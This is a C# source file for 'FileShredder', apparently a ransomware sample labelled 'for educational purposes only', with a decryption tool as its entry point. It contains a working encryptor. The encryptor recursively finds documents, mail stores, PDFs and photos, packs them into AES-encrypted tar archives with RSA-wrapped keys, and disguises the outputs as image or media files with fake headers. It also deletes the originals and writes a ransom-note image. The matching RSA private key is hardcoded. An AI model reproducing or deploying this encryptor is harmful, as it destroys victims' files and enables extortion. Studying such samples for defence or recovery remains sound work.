using System;
using ICSharpCode.SharpZipLib;
using System.Collections.Concurrent;
using System.Drawing;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using ICSharpCode.SharpZipLib.Tar;
using ICSharpCode.SharpZipLib.GZip;
using System.Threading;
using System.Linq;
using System.Drawing.Imaging;


namespace FileShredder
{
    class Program
    {
        private const string privateKey = "<RSAKeyValue><Modulus>rLvT2vG48AhFDaPPzLg8+HnaIMW/A49hjwCohyCNJOV2JO4WrTD054fuamwEsg312E5hfxbg6dsbVaiM49rpS6IV3YGw0ubUvEh1EWfDyFYjy9i88Mfrpifn+zwLYySWmcXc/M7IFZiA0VH+8yVSjNg2QdW9GkOgPNRAnHRGkbE=</Modulus><Exponent>AQAB</Exponent><P>5JKvmuFPavTXUvFVioU9mYHTxx0yjx9CMbYgf8U1cLWG2zyzGNdARCeuoHDlm59YuV8UrC+DJlKDQxFVY0N0/w==</P><Q>wXXePCnm3TNtFmsbdm8wZg/G0obmpUo4/7Q8gd48bDf5dHBE1oe5mbmXcKdDReBFELWisqsJ6FRsfg0FGieJTw==</Q><DP>ua2HRXO+Rg57VH+Dk7FFJwxV8yv+xFEKPsPKhsC29sYftL0MaCODq1no+6B6hP7e3kckzfMSwPDKfJL6IFbOFQ==</DP><DQ>sGp+zRhc2axStxXXBkpgtUF/ym2QGHy1u6AtaTQyn3Dvvxm9/G/qdV+D1QwCUc8wzAsGoa1NLJsIEG5pD6+sCw==</DQ><InverseQ>GlLcXu6poDet+9KJgI73qfogeRiLoHWL13dDRw345YGotfnyUE8FcPki+bRzLXgU3KXJAcxysPldqNJgHyAodQ==</InverseQ><D>SPXlXJuxhCHaGRLSWSSRDFtb2W/taPGNQbwDc2A6fhU2PA8dIPaG26089VK/AP6Ik184K1hclCrqdtoE+NGkrI18ieQIpAkZzGA9pLMIbp4WjhqawaQa3U7UbJs7AF1GfezAB67eVMoVTdqSIWlYlYUggb4Jn596liW42KgOw0k=</D></RSAKeyValue>";
        public static readonly Dictionary<string, byte[]> fileTypes = new Dictionary<string, byte[]>()
        {
            {".avi", new byte[] {0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x41, 0x56, 0x49, 0x20}},
            {".gif", new byte[] {0x47, 0x49, 0x46, 0x38, 0x39, 0x61}},
            {".png", new byte[] {0x89, 0x50, 0x4E, 0x47, 0x0D, 0x1A}},
            {".wav", new byte[] {0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45}},
        };

        public static void Main(string[] Args)
        {
            Console.WriteLine("");
            Console.WriteLine("__________.__.__           ________.__                     .___  .___            ");
            Console.WriteLine("\\_   _____|__|  |   ____  /   _____|  |_________  ____   __| _/__| _/___________ ");
            Console.WriteLine(" |    __) |  |  | _/ __ \\ \\_____  \\|  |  \\_  __ _/ __ \\ / __ |/ __ _/ __ \\_  __ \\");
            Console.WriteLine(" |     \\  |  |  |_\\  ___/ /        |   Y  |  | \\\\  ___// /_/ / /_/ \\  ___/|  | \\/");
            Console.WriteLine(" \\___  /  |__|____/\\___  /_______  |___|  |__|   \\___  \\____ \\____ |\\___  |__|   ");
            Console.WriteLine("     \\/                \\/        \\/     \\/           \\/     \\/    \\/    \\/       ");
            Console.WriteLine("Decrypt                                   v1.0 by disintegr8te (Twitter: disintegr8te)");
            Console.WriteLine();
            Console.WriteLine("For educational purposes only");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Please Enter the Path to the Directory which should be decrypted and Press [ENTER]. A 'recovery' Directory will be created under this Directory.");
            string Input = Console.ReadLine();
            Console.WriteLine("Is the Path:  " + Input + "  correct? Then Press 'Y' and [ENTER]");
            string Correct = Console.ReadLine();
            if (Correct == "Y" || Correct == "y")
            {
                UnshredFiles(Input);
            }

        }

        private static void UnshredFiles(String Input)
        {
            FileShredderRecovery fsr = new FileShredderRecovery(privateKey, 4);
            fsr.Decompress = true;
            fsr.DecryptDirectory(Input, Input + "\\recovery");
        }

        // Define other methods and classes here
        public void GenerateKey()
        {
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
            {
                Console.WriteLine("private const string privateKey = \"{0}\";", rsa.ToXmlString(true));
            }
        }

        public class FileShredder
        {
            public int DeleteSleepTimeMin = 0;
            public int DeleteSleepTimeMax = 0;
            public long MinInputFileSize = 0;
            public long MaxInputFileSize = 0;
            public long MaxOutputFileSize = 0;
            public int MaxFilesInArchive = 5;
            public bool Compress = false;

            private readonly Workers<FileInfo, EncryptionWorkerContext> filesToEncrypt = new Workers<FileInfo, EncryptionWorkerContext>(5);
            private readonly Workers<string> filesToDelete = new Workers<string>(20);
            private string publicKey;
            private readonly Regex defaultFileExtensions = new Regex(@"\.(?:doc[xm]?|xl[st][xm]?|accd[be]|mdb|msg|pps|ppt[xm]?|pst|pdf|jpe?g)$", RegexOptions.IgnoreCase);
            private Regex filesRegex;
            private readonly Random random = new Random();

            public FileShredder(string publicKey, Regex filesRegex)
            {
                if (filesRegex == null)
                {
                    this.filesRegex = defaultFileExtensions;
                }
                else
                {
                    this.filesRegex = filesRegex;
                }

                this.publicKey = publicKey;
                filesToEncrypt.StartWorkers(3, EncryptFileHandler, () => new EncryptionWorkerContext(), (ref EncryptionWorkerContext w) => w.Close());
                filesToDelete.StartWorkers(2, DeleteFileHandler);
            }

            public void EncryptDirectory(string directory)
            {
                ScanDirectory(directory);

                filesToEncrypt.CompleteAdding();
                filesToEncrypt.WaitAll();

                filesToDelete.CompleteAdding();
                filesToDelete.WaitAll();
            }

            private void ScanDirectory(string directory)
            {
                Console.WriteLine("ScanDirectory: {0}", directory);

                FileInfo[] files = new DirectoryInfo(directory).GetFiles();
                random.Shuffle(files);

                foreach (FileInfo file in files)
                {
                    if (MinInputFileSize > 0 && file.Length < MinInputFileSize)
                        continue;

                    if (MaxInputFileSize > 0 && file.Length > MaxInputFileSize)
                        continue;

                    if (!filesRegex.IsMatch(file.FullName))
                        continue;

                    filesToEncrypt.AddWork(file);
                    //EncryptFileHandler(file);
                }

                string[] directories = Directory.GetDirectories(directory);
                random.Shuffle(directories);
                foreach (string sub in directories)
                    ScanDirectory(sub);
            }

            private void EncryptFileHandler(EncryptionWorkerContext w, FileInfo file)
            {
                if (w.fileCount == 0)
                {
                    w.Close();

                    // create new one
                    CreateTarOutputStream(file, w);
                }

                TarFile(file.FullName, w.encryptedTarStream);

                w.filesSize += file.Length;
                ++w.fileCount;

                // check limits, if exceeded then reset them
                if ((w.fileCount >= MaxFilesInArchive && MaxFilesInArchive > 0) || (MaxOutputFileSize > 0 && w.filesSize >= MaxOutputFileSize))
                {
                    w.Reset();
                }
            }

            private void DeleteFileHandler(string file)
            {
                try
                {
                    File.Delete(file);
                    Console.WriteLine("DeleteFileHandler: {0}", file);

                    if (DeleteSleepTimeMin > 0 || DeleteSleepTimeMax > 0)
                        Thread.Sleep(random.Next(DeleteSleepTimeMin, DeleteSleepTimeMax));
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Could not delete file {0}: {1}", file, ex.Message);
                }
            }

            private CryptoStream GetEncryptStream(Stream output, byte[] header)
            {
                byte[] EncryptedKey;
                byte[] EncryptedIV;

                using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
                {
                    rsa.FromXmlString(publicKey);

                    // Create an AesManaged object
                    // with the specified key and IV.
                    using (Aes alg = new AesManaged())
                    {
                        alg.Mode = CipherMode.CBC;

                        // Encrypt Key and IV
                        EncryptedKey = rsa.Encrypt(alg.Key, false);
                        EncryptedIV = rsa.Encrypt(alg.IV, false);

                        // Create a encryptor to perform the stream transform.
                        ICryptoTransform encryptor = alg.CreateEncryptor(alg.Key, alg.IV);

                        // Create the streams used for encryption.
                        CryptoStream csEncrypt = new CryptoStream(output, encryptor, CryptoStreamMode.Write);

                        // write fake header
                        output.Write(header, 0, header.Length);

                        // write encrypted key and iv
                        output.Write(BitConverter.GetBytes(EncryptedKey.Length), 0, 2);
                        output.Write(EncryptedKey, 0, (int)EncryptedKey.Length);
                        output.Write(BitConverter.GetBytes(EncryptedIV.Length), 0, 2);
                        output.Write(EncryptedIV, 0, (int)EncryptedIV.Length);

                        return csEncrypt;
                    }
                }
            }

            private void CreateTarOutputStream(FileInfo encFile, EncryptionWorkerContext w)
            {
                KeyValuePair<string, byte[]> fileType = (from ft in fileTypes
                                                         select ft).Skip(random.Next(0, fileTypes.Count() - 1)).First();

                string extension = encFile.Extension;

                if (fileType.Key == extension)
                {
                    fileType = (from ft in fileTypes
                                where ft.Key != extension
                                select ft).First();
                }

                // remove old file extension and add new one
                string fileName = encFile.FullName;
                fileName = fileName.Substring(0, fileName.Length - extension.Length); // + fileType.Key
                fileName += fileType.Key;

                Console.WriteLine("CreateTarOutputStream: {0}", fileName);

                w.output = new FileStream(fileName, FileMode.Create, FileAccess.Write);
                CryptoStream crypt = GetEncryptStream(w.output, fileType.Value);

                if (Compress)
                {
                    w.encryptedTarStream = new TarOutputStream(new GZipOutputStream(crypt));
                }
                else
                    w.encryptedTarStream = new TarOutputStream(crypt);


                int rArch = random.Next(0, 5);
                if (w.archiveCount == 5)
                {
                    GenerateRansomNote(fileName + "_readme_.jpg");
                }

            }

            private void TarFile(string fileName, TarOutputStream tar)
            {
                Console.WriteLine("TarFile: {0}", fileName);

                using (Stream inputStream = File.OpenRead(fileName))
                {
                    string tarName = fileName.Substring(3); //.Replace('\\', '/'); // strip off "C:\"

                    long fileSize = inputStream.Length;

                    // Create a tar entry named as appropriate. You can set the name to anything,
                    // but avoid names starting with drive or UNC.
                    TarEntry entry = TarEntry.CreateTarEntry(tarName);

                    // Must set size, otherwise TarOutputStream will fail when output exceeds.
                    entry.Size = fileSize;

                    // Add the entry to the tar stream, before writing the data.
                    tar.PutNextEntry(entry);

                    // this is copied from TarArchive.WriteEntryCore
                    byte[] localBuffer = new byte[32 * 1024];
                    while (true)
                    {
                        int numRead = inputStream.Read(localBuffer, 0, localBuffer.Length);
                        if (numRead <= 0)
                            break;

                        tar.Write(localBuffer, 0, numRead);
                    }
                }

                tar.CloseEntry();

                filesToDelete.AddWork(fileName);
            }

            public void GenerateRansomNote(string targetFile)
            {
                Bitmap bmp = new Bitmap(800, 400);
                Random r = new Random();

                Console.WriteLine(targetFile);

                string firstText = "FileShredder";
                string secondText = "Test Case - your files are encrypted";

                PointF firstLocation = new PointF(43f, 100f);
                PointF secondLocation = new PointF(50f, 180f);
                PointF thirdLocation = new PointF(50f, 240f);

                using (Graphics graphics = Graphics.FromImage(bmp))
                {
                    using (Font arialFont = new Font("Arial", 50))
                    using (Font arialFont2 = new Font("Arial", 20))
                    {
                        graphics.DrawString(firstText, arialFont, Brushes.Green, firstLocation);
                        graphics.DrawString(secondText, arialFont2, Brushes.Black, secondLocation);
                    }

                    for (int x = 0; x < bmp.Width; x++)
                    {
                        for (int y = 0; y < bmp.Height; y++)
                        {
                            int num = random.Next(200, 255);
                            Pen brush = new Pen(Color.FromArgb(150, num, num, num));
                            //bmp.SetPixel(x, y, Color.FromArgb(0, num, num, num));
                            graphics.DrawLine(brush, x, y, x + 1, y + 1);
                        }
                    }
                }


                bmp.Save(targetFile, ImageFormat.Jpeg);
            }
        }

        public class FileShredderRecovery
        {
            private const int BUFFER_SIZE = 1024 * 512;
            public bool Decompress = false;

            private readonly Workers<FileInfo> filesToDecrypt = new Workers<FileInfo>(10);
            private string privateKey;
            private string recoveryOutputDirectory;

            public FileShredderRecovery(string privateKey, int numWorkers = 4)
            {
                this.privateKey = privateKey;
                filesToDecrypt.StartWorkers(numWorkers, DecryptFileHandler);
            }

            public void DecryptDirectory(string directory, string recoveryOutputDirectory)
            {
                this.recoveryOutputDirectory = recoveryOutputDirectory;

                ScanDirectory(directory);

                filesToDecrypt.CompleteAdding();
                filesToDecrypt.WaitAll();
            }

            private void ScanDirectory(string directory)
            {
                Console.WriteLine("ScanDirectory: {0}", directory);

                FileInfo[] files = new DirectoryInfo(directory).GetFiles();
                foreach (FileInfo file in files)
                {
                    if (fileTypes.ContainsKey(file.Extension))
                        filesToDecrypt.AddWork(file);
                    //DecryptFileHandler(file);
                }

                string[] directories = Directory.GetDirectories(directory);
                foreach (string sub in directories)
                    ScanDirectory(sub);
            }

            private void DecryptFileHandler(FileInfo file)
            {
                Console.WriteLine("DecryptFileHandler: {0}", file.FullName);

                try
                {
                    // Create an AesManaged object
                    // with the specified key and IV.
                    using (Aes alg = new AesManaged())
                    {
                        alg.Mode = CipherMode.CBC;

                        // Create the streams used for decryption.
                        using (FileStream fsInput = file.Open(FileMode.Open, FileAccess.Read))
                        {
                            byte[] buffer = new byte[BUFFER_SIZE];

                            if (fileTypes.ContainsKey(file.Extension))
                            {
                                // read fake header
                                fsInput.Read(buffer, 0, fileTypes[file.Extension].Length);
                            }

                            // read KeyLength
                            fsInput.Read(buffer, 0, 2);
                            int KeyLength = BitConverter.ToInt16(buffer, 0);

                            // read EncryptedKey
                            byte[] EncryptedKey = new byte[KeyLength];
                            fsInput.Read(EncryptedKey, 0, KeyLength);

                            // read IVLength
                            fsInput.Read(buffer, 0, 2);
                            int IVLength = BitConverter.ToInt16(buffer, 0);

                            // read EncryptedIV
                            byte[] EncryptedIV = new byte[IVLength];
                            fsInput.Read(EncryptedIV, 0, IVLength);

                            // decrypt Key and IV
                            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
                            {
                                rsa.FromXmlString(privateKey);
                                alg.Key = rsa.Decrypt(EncryptedKey, false);
                                alg.IV = rsa.Decrypt(EncryptedIV, false);
                            }

                            // Create a decrytor to perform the stream transform.
                            ICryptoTransform decryptor = alg.CreateDecryptor();


                            // Create the streams used for decryption.
                            using (CryptoStream csDecrypt = new CryptoStream(fsInput, decryptor, CryptoStreamMode.Read))
                            {
                                TarInputStream tar;
                                if (Decompress)
                                {
                                    tar = new TarInputStream(new GZipInputStream(csDecrypt));
                                }
                                else
                                {
                                    tar = new TarInputStream(csDecrypt);
                                }

                                TarEntry tarEntry;
                                while ((tarEntry = tar.GetNextEntry()) != null)
                                {
                                    WriteTarEntry(tar, tarEntry);
                                }

                                tar.Close();
                            }
                        }
                    }
                }
                catch (CryptographicException ex)
                {
                    Console.WriteLine("CryptographicException in DecryptFileHandler {0}\n{1}", file.FullName, ex.Message);
                }
                catch (OverflowException ex)
                {
                    Console.WriteLine("OverflowException in DecryptFileHandler {0}\n{1}", file.FullName, ex.Message);
                }
            }

            private void WriteTarEntry(TarInputStream tar, TarEntry tarEntry)
            {
                if (tarEntry.IsDirectory)
                    return;

                // Converts the unix forward slashes in the filenames to windows backslashes
                string name = tarEntry.Name.Replace('/', Path.DirectorySeparatorChar);

                // Remove any root e.g. '\' because a PathRooted filename defeats Path.Combine
                if (Path.IsPathRooted(name))
                    name = name.Substring(Path.GetPathRoot(name).Length);

                // Apply further name transformations here as necessary
                string outName = Path.Combine(recoveryOutputDirectory, name);

                string directoryName = Path.GetDirectoryName(outName);

                // Does nothing if directory exists
                Directory.CreateDirectory(directoryName);

                using (FileStream outStr = new FileStream(outName, FileMode.Create))
                {
                    tar.CopyEntryContents(outStr);
                    outStr.Close();
                }

                // Set the modification date/time. This approach seems to solve timezone issues.
                DateTime myDt = DateTime.SpecifyKind(tarEntry.ModTime, DateTimeKind.Utc);
                File.SetLastWriteTime(outName, myDt);
            }
        }
    }

    static class RandomExtensions
    {
        public static void Shuffle<T>(this Random rng, T[] array)
        {
            int n = array.Length;
            while (n > 1)
            {
                int k = rng.Next(n--);
                T temp = array[n];
                array[n] = array[k];
                array[k] = temp;
            }
        }
    }



    public class Workers<T, W> : Workers<T>
    {
        public delegate void ConsumeWorker(W worker, T item);
        public delegate W Construct();
        public delegate void Finalize(ref W worker);

        public Workers() : base()
        {
        }

        public Workers(BlockingCollection<T> queue) : base(queue)
        {
        }

        public Workers(int capacity) : base(capacity)
        {
        }

        public void StartWorkers(int workerCount, ConsumeWorker method, Construct construct, Finalize finalize)
        {
            for (int i = 0; i < workerCount; i++)
            {
                tasks.Add(
                    System.Threading.Tasks.Task.Factory.StartNew(() =>
                    {
                        W w = construct();

                        foreach (T t in queue.GetConsumingEnumerable())
                        {
                            method(w, t);
                        }

                        finalize(ref w);
                    })
                );
            }
        }
    }

    public class EncryptionWorkerContext
    {
        public TarOutputStream encryptedTarStream = null;
        public FileStream output = null;
        public int fileCount = 0;
        public long filesSize = 0;
        public int archiveCount = 0;
        public void Reset()
        {
            fileCount = 0;
            filesSize = 0;
        }

        public void Close()
        {
            // close previous stream if any
            if (encryptedTarStream != null)
            {
                encryptedTarStream.Flush();
                encryptedTarStream.Close();
            }

            if (output != null)
                output.Close();
        }
    }

    public class Workers<T>
    {
        protected BlockingCollection<T> queue;
        protected List<Task> tasks = new List<Task>();

        public delegate void Consume(T item);

        public Workers()
        {
            queue = new BlockingCollection<T>();
        }

        public Workers(int capacity)
        {
            queue = new BlockingCollection<T>(capacity);
        }

        public Workers(BlockingCollection<T> items)
        {
            this.queue = items;
        }

        public void StartWorkers(int workerCount, Consume method)
        {
            for (int i = 0; i < workerCount; i++)
            {
                tasks.Add(
                    Task.Factory.StartNew(() =>
                    {
                        foreach (T t in queue.GetConsumingEnumerable())
                        {
                            method(t);
                        }
                    })
                );
            }
        }

        public void AddWork(T item)
        {
            queue.Add(item);
        }

        public void CompleteAdding()
        {
            queue.CompleteAdding();
        }

        public int Count
        {
            get
            {
                return queue.Count;
            }
        }

        public bool IsAddingCompleted
        {
            get
            {
                return queue.IsAddingCompleted;
            }
        }

        public bool IsCompleted
        {
            get
            {
                return queue.IsCompleted;
            }
        }

        public void WaitAll()
        {
            Task.WaitAll(tasks.ToArray());
        }
    }


}


